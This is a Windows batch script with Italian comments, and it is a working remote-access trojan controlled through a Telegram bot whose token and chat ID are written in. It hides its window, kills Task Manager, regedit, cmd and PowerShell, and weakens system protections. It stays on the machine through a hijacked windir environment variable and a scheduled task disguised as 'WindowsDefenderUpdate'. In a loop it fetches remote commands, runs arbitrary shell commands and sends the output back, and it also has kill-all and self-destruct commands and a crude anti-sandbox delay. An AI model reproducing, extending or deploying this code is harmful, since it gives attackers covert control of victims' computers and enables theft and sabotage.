@echo off
:: Modalità Stealth Avanzata
if not "%1"=="--ghost" (
    call :hideWindow
    start /B /MIN "" "%~f0" --ghost
    exit
)

:: Funzione per nascondere la finestra
:hideWindow
echo Set objWSH = CreateObject("WScript.Shell") > "%TEMP%\.sys32.vbs"
echo objWSH.Run "%~f0 --ghost", 0, False >> "%TEMP%\.sys32.vbs"
wscript.exe "%TEMP%\.sys32.vbs" & del "%TEMP%\.sys32.vbs"
exit /b

:: Configurazione Bot
:ghost
setlocal enabledelayedexpansion
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

:: Kill Switch - Termina processi chiave
:kill_processes
for %%p in (
    "taskmgr.exe" "processhacker.exe" "procexp.exe" "procexp64.exe"
    "msconfig.exe" "regedit.exe" "cmd.exe" "powershell.exe" "wscript.exe"
    "cscript.exe" "perfmon.exe" "resmon.exe" "eventvwr.exe"
) do (
    taskkill /f /im %%p >nul 2>&1
    powershell -nop -c "Stop-Process -Name '%%~np' -Force -ErrorAction SilentlyContinue"
)

:: Anti-Debugging Techniques
powershell -nop -c "
    # Blocca porte di debug
    netsh advfirewall firewall add rule name='BlockDebug' dir=in action=block protocol=TCP localport=1337,5858,8000,9000,4711 >$null 2>&1
    
    # Disabilita strumenti di analisi
    reg add 'HKLM\Software\Policies\Microsoft\Windows NT\SystemRestore' /v DisableSR /t REG_DWORD /d 1 /f >$null 2>&1
    reg add 'HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate' /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >$null 2>&1
"

:: Persistenza Avanzata
:persistence
reg add "HKCU\Environment" /v windir /t REG_SZ /d "cmd /c start \"\" \"%~f0\" --ghost & \"%%SystemRoot%%\\system32\\cmd.exe\"" /f >nul 2>&1
schtasks /create /tn "WindowsDefenderUpdate" /tr "\"%~f0\" --ghost" /sc minute /mo 5 /f >nul 2>&1

:: Main Bot Loop
:bot_loop
set "COMMAND="

:: Ottieni comandi dal C2
for /f "delims=" %%A in ('powershell -nop -c "$r=try{irm '!API_URL!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{};$r.result[-1].message.text"') do (
    set "COMMAND=%%A"
)

:: Esegui comandi con evasione
if defined COMMAND (
    if "!COMMAND!"=="killall" (
        powershell -nop -c "gps | ? {$_.ProcessName -notmatch 'svchost|explorer|System|Idle'} | Stop-Process -Force"
    )
    
    if "!COMMAND:~0,6!"=="shell:" (
        set "CMD=!COMMAND:~6!"
        for /f "delims=" %%B in ('cmd /c "!CMD!" 2^>^&1') do set "OUTPUT=%%B"
        powershell -nop -c "irm '!API_URL!/sendMessage?chat_id=%CHAT_ID%' -Method POST -Body @{text='!OUTPUT!'} -UseBasicParsing"
    )
    
    if "!COMMAND!"=="selfdestruct" (
        powershell -nop -c "
            schtasks /delete /tn 'WindowsDefenderUpdate' /f;
            reg delete 'HKCU\Environment' /v windir /f;
            del '%~f0', '%TEMP%\.sys32.vbs', '%APPDATA%\Microsoft\Windows\Start Menu\svchost.bat' -Force
        "
        exit
    )
)

:: Delay randomico con tecniche anti-sandbox
powershell -nop -c "
    $rnd = Get-Random -Minimum 7 -Maximum 18;
    $antiVM = (Get-WmiObject Win32_ComputerSystem).Model;
    if ($antiVM -notmatch 'Physical') { $rnd = 3 };
    Start-Sleep -Seconds $rnd
"
goto bot_loop
